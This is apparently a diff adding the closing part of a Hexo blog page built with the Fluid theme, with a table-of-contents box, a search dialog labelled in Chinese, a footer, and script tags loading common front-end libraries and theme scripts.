+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js" ></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({"theme":"default"});
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
